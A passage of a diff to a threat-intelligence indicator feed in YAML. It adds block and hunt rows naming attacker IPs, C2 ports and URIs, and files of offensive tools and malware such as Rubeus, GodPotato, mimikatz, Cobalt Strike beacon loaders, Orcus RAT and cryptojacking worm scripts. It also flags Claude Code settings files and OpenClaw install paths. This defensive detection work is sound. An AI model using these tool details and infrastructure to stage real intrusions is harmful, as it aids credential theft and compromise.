+      context: "RoguePotato, public native tool (prebuilt, hash-match). SeImpersonate privesc (itm4n)."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "rubeus.exe"
+      context: "Rubeus (GhostPack), operator-recompiled .NET (compile 2026-03-23). Kerberos abuse (kerberoast/asktgt/s4u). Identified as public tool via signature, not hash identity."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "sharpsuccessor.exe"
+      context: "SharpSuccessor (BadSuccessor / dMSA AD privesc), operator-recompiled .NET. Identified as public tool via signature, not hash identity."
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "sweetpotato.exe"
+      context: "SweetPotato (combined Potato), operator-recompiled .NET. YARA HKTL_NET_GUID_SweetPotato (typelibguid, Neo23x0) + tool_sharpefspotato_strings. Identified as public tool via HKTL-GUID, not hash identity. ITW IP 67.215.232.25."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -3794,10 +4372,10 @@
   feed_url: "/ioc-feeds/fleetagentadvanced-exe.json"
   report_url: null
   detection_url: "/hunting-detections/fleetagentadvanced-exe-detections"
-  total: 14
+  total: 15
   untyped: 55
   counts:
-    filename: 2
+    filename: 3
     ipv4: 1
     md5: 1
     path: 5
@@ -3881,6 +4459,12 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "fleetagentadvanced.exe"
+      context: "Dropper/Installer"
+      confidence: null
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "fleetagentadvanced_final.exe"
       context: "Dropper/Installer"
       confidence: null
@@ -3903,9 +4487,10 @@
   feed_url: "/ioc-feeds/fleetagentfud-exe.json"
   report_url: null
   detection_url: "/hunting-detections/fleetagentfud-exe-detections"
-  total: 4
+  total: 5
   untyped: 48
   counts:
+    filename: 1
     ipv4: 1
     md5: 1
     sha1: 1
@@ -3938,6 +4523,12 @@
       confidence: null
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "fleetagentfud.exe"
+      context: "RAT with FUD evasion"
+      confidence: null
+      action: null
+      fp_risk: null
   never_block_total: 0
   never_block_rows:
 "ghost-cryptojacker-vova75rus-77.110.96.200":
@@ -3949,11 +4540,11 @@
   feed_url: "/ioc-feeds/ghost-cryptojacker-vova75rus-77.110.96.200-iocs.json"
   report_url: "/reports/ghost-cryptojacker-vova75rus-77.110.96.200/"
   detection_url: "/hunting-detections/ghost-cryptojacker-vova75rus-77.110.96.200-detections"
-  total: 50
+  total: 57
   untyped: 36
   counts:
     domain: 8
-    filename: 7
+    filename: 14
     ipv4: 2
     md5: 1
     path: 12
@@ -4246,9 +4837,21 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "check_comfyui.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "dbus-session-monitor / xmrigggggsteal"
       context: null
       confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "get_all_ranges.sh"
+      context: null
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
@@ -4259,6 +4862,36 @@
       fp_risk: null
     - type: "filename"
       value: "gnome-shell-ext-updater / lmmiineeer"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "hyst.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "libpam_cache.c"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "libpam_cache.so"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "min1.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "op_bash_history.txt"
       context: null
       confidence: "HIGH"
       action: null
@@ -4286,11 +4919,11 @@
   feed_url: "/ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json"
   report_url: "/reports/gocloud-multiservice-cryptojacking-149-28-112-221/"
   detection_url: "/hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections"
-  total: 135
+  total: 177
   untyped: 17
   counts:
     domain: 6
-    filename: 2
+    filename: 44
     ipv4: 2
     md5: 33
     path: 8
@@ -5101,15 +5734,267 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "a.py"
+      context: "LAN lateral-movement probe (canary payloads, not a worm)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "add_log4spring_to_batch.py"
+      context: "Injects ex_log4shell/ex_spring4shell"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "add_oa_funcs.py"
+      context: "OA/ERP exploit patcher (captured copy is a broken draft)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "allinone.ps1"
+      context: "One-click Windows deploy; typo'd wallet live"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "append_part.py"
+      context: "Adds EXPLOIT_EXTRA tier"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "authorized_keys"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "batch_exploit.py"
+      context: "GOCLOUD BatchExploit v1 central exploit dispatcher"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "config.json"
+      context: "Served static XMRig config"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "deploy.bat"
       context: "Node-1 :8080 entry dropper; only an 8-char SHA256 prefix was captured"
       confidence: "MODERATE"
       action: null
       fp_risk: null
     - type: "filename"
+      value: "deploy.ps1"
+      context: "Windows worm - internet-cafe miner + LAN spread (凌凯矿机 v3.0); typo'd wallet live"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "deploy_v3.sh"
+      context: "Deploys GOCLOUD OmniHunter v3"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exploit_runner.py"
+      context: "Multi-product exploit runner; carries wallet typo constant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exploit_v2.py"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exploit_v3.py"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fix_fofa.py"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fix_fofa2.py"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fix_vultr.sh"
+      context: "Port-8080 payload-server deploy (revised)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fofa_batch.py"
+      context: "FOFA targeting engine, 26 categories, country=CN"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "infect.ps1"
+      context: "Win10/11 5-method per-target infection engine"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "inject_fofa.sh"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "insert_zero.py"
+      context: "Patches /opt/omnihunter_v4.py"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "listener2.py"
+      context: "Reverse-shell catcher + unauthenticated :9997 control plane (node 2)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "log4j_listener.py"
+      context: "Log4Shell hit-counter (scan-only, no victims evidenced)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "loop_batch.py"
+      context: "Converts dispatcher to infinite-loop daemon"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "loop_scan.py"
+      context: "Early-gen one-shot scanner"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "miner.sh"
+      context: "GOCLOUD miner v7 Linux XMRig deployer"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "omnihunter.py"
+      context: "OmniHunter v4 orchestrator (node 2); carries shared FOFA key + correct wallet"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "probe_target.py"
+      context: "Diagnostic against known Jenkins victims"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "re_exploit.py"
+      context: "Re-attack script against hardcoded Jenkins targets"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "redrop.py"
+      context: "Fairness wrapper + :8888 C2 panel scraper"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "report_miner.sh"
+      context: "Post-compromise recon; carries wallet typo constant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "report_server.py"
+      context: "Raw telemetry logger, port 8081"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "run_report.py"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "scanner.py"
+      context: "Early-gen one-shot scanner; carries wallet typo constant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "setup.bat"
+      context: "c3pool + worm.vbs via certutil + schtasks"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "setup.sh"
+      context: "VPS bootstrap; wallet typo operationally live here"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "upgrade_v31.sh"
+      context: "Upgrades OmniHunter to v3.1"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vultr_miner_serve.sh"
+      context: "Port-8080 payload-server deploy"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "watchdog2.py"
+      context: "Self-healing dead-worker re-exploitation daemon"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "winminer.ps1"
+      context: "Windows XMRig deployer; VT 9/61, Kaspersky UDS:Trojan.PowerShell.Generic"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "winring0x64.sys"
+      context: "Stock WinRing0 1.2.0.5 MSR driver bundled with XMRig"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "worm.vbs"
       context: "Node-1 :8080 worm propagation core; only an 8-char SHA256 prefix was captured"
       confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xmrig.exe"
+      context: "Stock XMRig Windows miner (node 2)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "zero_day_extras.py"
+      context: "OmniHunter rce_log4shell/rce_spring4shell source"
+      confidence: "HIGH"
       action: null
       fp_risk: null
   never_block_total: 0
@@ -5720,12 +6605,12 @@
   feed_url: "/ioc-feeds/kaido-quasar-rat-iocs.json"
   report_url: "/reports/kaido-quasar-rat-144-172-109-203/"
   detection_url: "/hunting-detections/kaido-quasar-rat-detections"
-  total: 19
+  total: 20
   untyped: 4
   counts:
     domain: 6
     filename: 1
-    ipv4: 2
+    ipv4: 3
     md5: 1
     path: 2
     pattern: 1
@@ -5735,6 +6620,12 @@
   has_action: true
   has_fp_risk: false
   rows:
+    - type: "ipv4"
+      value: "144.172.109.203"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
     - type: "ipv4"
       value: "144.172.109.203:4782"
       context: null
@@ -5860,11 +6751,12 @@
   feed_url: "/ioc-feeds/korean-claude-openclaw-221.150.15.104-iocs.json"
   report_url: "/reports/korean-claude-openclaw-221.150.15.104/"
   detection_url: "/hunting-detections/korean-claude-openclaw-221.150.15.104-detections"
-  total: 6
-  untyped: 10
+  total: 10
+  untyped: 6
   counts:
     domain: 3
     ipv4: 1
+    path: 4
     url: 2
   has_confidence: true
   has_action: true
@@ -5880,7 +6772,7 @@
       value: "docs.openclaw.ai"
       context: null
       confidence: "DEFINITE"
-      action: null
+      action: "MONITOR FOR `WEBFETCH(DOMAIN:DOCS.OPENCLAW.AI)` PATTERN IN CLAUDE CODE PERMISSION ALLOWLISTS"
       fp_risk: null
     - type: "domain"
       value: "lightmake.site"
@@ -5898,13 +6790,37 @@
       value: "http://221.150.15.104:8080/"
       context: null
       confidence: "DEFINITE"
-      action: "BLOCK EGRESS FROM YOUR ESTATE; THIS IS THE DISCOVERY VECTOR, NOT AN ATTACK SURFACE AGAINST YOUR ENVIRONMENT"
+      action: "BLOCK EGRESS FROM YOUR ESTATE"
       fp_risk: null
     - type: "url"
       value: "https://openclaw.ai/install.sh"
       context: null
       confidence: "DEFINITE"
-      action: null
+      action: "BLOCK AT PROXY / EGRESS FILTER UNLESS OPENCLAW USE IS EXPLICITLY SANCTIONED IN YOUR ENVIRONMENT"
+      fp_risk: null
+    - type: "path"
+      value: "<project-root>/.claude/settings.local.json"
+      context: null
+      confidence: "DEFINITE"
+      action: "SWEEP DEVELOPER ENDPOINTS FOR `.CLAUDE/SETTINGS.LOCAL.JSON` UNDER REPOSITORY WORKING DIRECTORIES"
+      fp_risk: null
+    - type: "path"
+      value: "~/.claude/settings.local.json"
+      context: null
+      confidence: "DEFINITE"
+      action: "ADD TO FILESYSTEM HUNT QUEUES ACROSS DEVELOPER-CLASS AND ADMIN-CLASS ENDPOINTS"
+      fp_risk: null
+    - type: "path"
+      value: "~/.openclaw/"
+      context: null
+      confidence: "DEFINITE"
+      action: "INVENTORY; SURFACE COMBINED CLAUDE CODE + OPENCLAW INSTALLATIONS FOR REVIEW"
+      fp_risk: null
+    - type: "path"
+      value: "~/.openclaw/completions/openclaw.ps1"
+      context: null
+      confidence: "DEFINITE"
+      action: "INVENTORY + CORRELATE WITH POWERSHELL SESSION LOGS"
       fp_risk: null
   never_block_total: 0
   never_block_rows:
@@ -6204,11 +7120,11 @@
   feed_url: "/ioc-feeds/new-files-found-20260408-iocs.json"
   report_url: "/reports/new-files-found-20260408/"
   detection_url: "/hunting-detections/new-files-found-20260408-detections"
-  total: 69
+  total: 76
   untyped: 29
   counts:
-    filename: 16
-    ipv4: 3
+    filename: 22
+    ipv4: 4
     md5: 7
     path: 2
     pattern: 8
@@ -6219,6 +7135,12 @@
   has_action: false
   has_fp_risk: true
   rows:
+    - type: "ipv4"
+      value: "172.105.0.126"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: "MODERATE - Linode shared hosting IP; block only in context of associated behavioral indicators"
     - type: "ipv4"
       value: "172.105.0.126:50050"
       context: "CS team server management port, if externally accessible, additional exposure vector"
@@ -6491,97 +7413,133 @@
       fp_risk: null
     - type: "filename"
       value: "artifact32svc.exe"
-      context: "CS Artifact Kit service (x86, EAX-redirect)"
+      context: "Artifact Kit service variant, EAX-redirect process hollowing, DceRpcSs service"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "artifact64svc.exe"
-      context: "CS Artifact Kit service (x64, EAX-redirect)"
+      context: "x64 Artifact Kit service variant, mirrors artifact32svc hollowing pattern"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon80.dll"
-      context: null
+      context: "CS 4.4 beacon DLL, Malleable C2 profile (/en_US/all.js), watermark=987654321, IE9 UA"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_dl.exe"
-      context: "Custom CreateThread loader"
+      context: "Custom CreateThread loader, download-mode beacon payload"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_full.exe"
-      context: "Custom CreateThread loader (full payload)"
+      context: "Custom CreateThread loader, full-feature beacon payload"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_full.x64.dll"
-      context: null
+      context: "CS 4.4 beacon DLL, RSA-1024, watermark=0, port 80"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_loader.exe"
-      context: "Custom shellcode loader"
+      context: "Base shellcode indirect-call loader"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "beacon_patched.exe"
+      context: "Artifact-wrapped beacon, Trinity RSA-2048, port 80, watermark 987654321"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_port80.x64.dll"
-      context: null
+      context: "CS 3.x beacon DLL, RSA-2048 Trinity key, watermark=0, port 80"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_rdi.exe"
-      context: "Custom RDI loader"
+      context: "RDI loader, hardcoded offset 0x1649c ReflectiveLoader call"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "beacon_rdi.exe | beacon_cs_debug.exe"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_srdi2.exe"
-      context: "Custom sRDI v2 loader"
+      context: "sRDI v2 loader, same base loader as beacon_loader, 310KB payload"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_windows_x64.exe"
-      context: "Gen-4 OpenStrike custom beacon"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "beacon_x64_sniff.exe"
+      context: "Sniffer beacon config, port 809, /ga.js URI"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "covertvpn.dll"
-      context: "CS CovertVPN L2 bridge module"
+      context: "CovertVPN L2 bridge, ICMP tunnel, 5 transport channels, embedded WinPcap 4.1.3"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "dll_exec.exe"
-      context: "Simple DLL execution utility"
+      context: "Simple LoadLibraryA(argv[1]) utility"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "dll_loader.exe"
-      context: "Disk-drop DLL loader"
+      context: "Disk-drop loader, LoadLibraryA(C:\\Windows\\Temp\\beacon.dll), infinite keepalive"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
+      value: "hello.exe"
+      context: ".NET execute-assembly test binary"
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "mini_beacon.exe"
-      context: "Gen-1 OpenStrike prototype"
+      context: "Gen-1 OpenStrike prototype, HTTP-only poller, no crypto, no commands"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "mini_beacon2.exe"
-      context: "Gen-2 OpenStrike with RSA"
+      context: "Gen-2 OpenStrike, RSA-1024 registration, elevation check, no commands"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "stager_http_x64.exe"
+      context: "1KB PE stager, port 80, URI /au2U"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "stager_http_x64.ps1"
+      context: "PS1 stager wrapper, port 80, URI /msI4"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -6644,9 +7602,10 @@
   feed_url: "/ioc-feeds/newdouble-clickfix-iocs.json"
   report_url: "/reports/newdouble-clickfix/"
   detection_url: "/hunting-detections/newdouble-clickfix-detections"
-  total: 11
+  total: 13
   untyped: 1
   counts:
+    filename: 2
     md5: 3
     path: 3
     pattern: 1
@@ -6714,6 +7673,18 @@
       value: "%APPDATA%\\MyApp\\y.ps1"
       context: null
       confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "x.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "y.ps1"
+      context: null
+      confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "pattern"
@@ -6863,11 +7834,11 @@
   feed_url: "/ioc-feeds/open-directory-172-105-0-126-20260406-iocs.json"
   report_url: "/reports/open-directory-172-105-0-126-20260406/"
   detection_url: "/hunting-detections/open-directory-172-105-0-126-20260406-detections"
-  total: 70
+  total: 71
   untyped: 18
   counts:
     filename: 8
-    ipv4: 1
+    ipv4: 2
     md5: 13
     path: 7
     pattern: 10
@@ -6878,6 +7849,12 @@
   has_action: false
   has_fp_risk: true
   rows:
+    - type: "ipv4"
+      value: "172.105.0.126"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: "MODERATE - Linode shared hosting IP; block only in context of associated behavioral indicators"
     - type: "ipv4"
       value: "172.105.0.126:8443"
       context: null
@@ -7192,13 +8169,13 @@
       fp_risk: null
     - type: "filename"
       value: "beacon.exe"
-      context: "OpenStrike C beacon implant"
+      context: "OpenStrike C beacon - custom C implant, MinGW GCC 15, 11 commands (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon_patched.x64.dll"
-      context: "CS 3.x DLL beacon with tripwired ReflectiveLoader"
+      context: "CS 3.x DLL beacon - MSVC 2012, watermark=0, XOR 0x2E config, tripwired ReflectiveLoader"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -7210,31 +8187,31 @@
       fp_risk: null
     - type: "filename"
       value: "dbg_loader.exe"
-      context: "Entry-point debugger tool"
+      context: "Entry-point debugger - INT3 patch at CALL RAX (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "run.exe"
-      context: "Minimal shellcode runner (generic name)"
+      context: "Minimal shellcode runner - bare VirtualAlloc+call (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "sc_loader.exe"
-      context: "SEH-based shellcode loader"
+      context: "SEH-based shellcode loader - CreateThread, 30s timeout (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "stager.exe"
-      context: "Shellcode downloader/stager"
+      context: "Shellcode stager - downloads from /qz99, executes via CreateThread (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "veh_loader.exe"
-      context: "VEH shellcode test harness"
+      context: "VEH test harness - reads C:\\cs_final.dat, 30s timeout (original)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -7309,11 +8286,11 @@
   feed_url: "/ioc-feeds/open-directory-94-103-1-13-20260423-iocs.json"
   report_url: "/reports/open-directory-94-103-1-13-20260423/"
   detection_url: "/hunting-detections/open-directory-94-103-1-13-20260423-detections"
-  total: 87
+  total: 118
   untyped: 74
   counts:
     domain: 7
-    filename: 9
+    filename: 40
     ipv4: 1
     md5: 5
     path: 10
@@ -7723,8 +8700,44 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "Stage-5b UAC bypass (decrypted), CROSS-BUILD INVARIANT"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "audiodriver.exe"
       context: "Orcus install-path filename under %APPDATA%\\Microsoft\\Speech"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel.exe"
+      context: "Chisel tunneling tool, Go 1.23.1, 9.8 MB"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp.exe"
+      context: "Standard GodPotato, labeled in version info"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp2.exe"
+      context: "GodPotato CLR v2 variant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp_fat.exe"
+      context: "GodPotato variant, 2026-04-02 build"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "gp_obf.exe"
+      context: "Obfuscated GodPotato (internal name SvcUtil.exe, compiled 2026-04-02)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -7735,27 +8748,171 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "interact.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimidrv.sys"
+      context: "Mimikatz kernel driver, 2022-09-19 build"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimikatz.exe"
+      context: "Stock gentilkiwi mimikatz, 2022-09-19 build"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimilib.dll"
+      context: "Mimikatz SSPI password filter for LSA persistent credential harvesting"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimilove.exe"
+      context: "Mimikatz Win2000-targeted variant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimispool.dll"
+      context: "Stock PrintNightmare CVE-2021-1675 payload DLL (VT 60/77)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "mydfile.exe"
       context: null
       confidence: "LOW"
       action: null
       fp_risk: null
     - type: "filename"
+      value: "myfile Stage-4 (decrypted)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile Stage-5a (decrypted), Chaos/TorBrowserTor ransomware (myfile build)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile Stage-5a ciphertext"
+      context: "11,856 bytes (byte-exact size match to mymain Stage-5a, rebuilt per campaign)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile Stage-5b ciphertext"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile chunk 0 (decrypted)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile chunk 1 (decrypted)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "myfile chunk 1 inner resource ciphertext"
+      context: "1,025,424 bytes extracted from resource CXkfzafq...EHdigjZ"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "myfile.bat"
-      context: "Sibling Stage-1 DOSfuscated loader dropper"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
       value: "myfile.exe"
-      context: "Orcus RAT dropper name in staging"
+      context: "Orcus RAT v7 Wardow crack, primary sample, 865 KB .NET"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain Stage-4 (decrypted)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain Stage-4 ciphertext"
+      context: "1,025,296-byte ciphertext extracted from chunk 1 resource vqnxIVVk..."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain Stage-5a (decrypted), Chaos/TorBrowserTor ransomware"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain Stage-5a ciphertext"
+      context: "11,856-byte ciphertext from Stage-4 resource IazvXcueDgcoXWWL..."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain Stage-5b ciphertext"
+      context: "983,872-byte ciphertext from Stage-4 resource HxBTHTPGSMVbIZYM..."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain boot re-loader PS (decoded from scheduled task arg blob)"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain chunk 0 (decrypted)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mymain chunk 1 (decrypted)"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
       value: "mymain.bat"
-      context: "Stage-1 DOSfuscated loader dropper"
+      context: null
       confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "p.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "plink.exe"
+      context: "PuTTY plink SSH client, used for SSH tunneling"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "printspoofer.exe"
+      context: "Stock public PrintSpoofer x64 tool, 2020-09-10"
+      confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
@@ -7767,6 +8924,12 @@
     - type: "filename"
       value: "surprise.exe"
       context: "Removable drive spread filename (mymain build)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "svc.exe"
+      context: "MSILHeracles Potato variant, epoch-zero timestamp (evasion)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -7886,14 +9049,16 @@
   feed_url: "/ioc-feeds/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-iocs.json"
   report_url: "/reports/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817/"
   detection_url: "/hunting-detections/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-detections"
-  total: 118
+  total: 186
   untyped: 13
   counts:
     domain: 2
+    filename: 68
     ipv4: 2
     path: 13
     pattern: 27
-    sha256: 71
+    sha1: 1
+    sha256: 70
     url: 3
   has_confidence: true
   has_action: true
@@ -8242,12 +9407,6 @@
       action: null
       fp_risk: null
     - type: "sha256"
-      value: "aab136e06c94e5616832afa34af096bd6b77151c"
-      context: null
-      confidence: "DEFINITE"
-      action: null
-      fp_risk: null
-    - type: "sha256"
